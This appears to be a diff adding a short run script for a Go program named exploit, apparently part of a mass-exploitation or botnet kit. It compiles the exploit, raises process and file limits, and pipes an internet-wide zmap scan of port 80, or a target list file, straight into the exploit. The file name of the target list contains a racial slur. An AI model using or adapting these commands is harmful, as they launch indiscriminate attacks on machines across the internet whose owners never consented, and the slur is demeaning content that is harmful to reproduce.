@@ -1,0 +1,5 @@
+go build exploit.go
+
+ulimit -n 999999; ulimit -u999999; zmap -p80 -b IPBlacklist.conf -w world.zone -q | ./exploit 80
+
+ulimit -n 999999; ulimit -u999999; cat niggas.txt | ./exploit 80
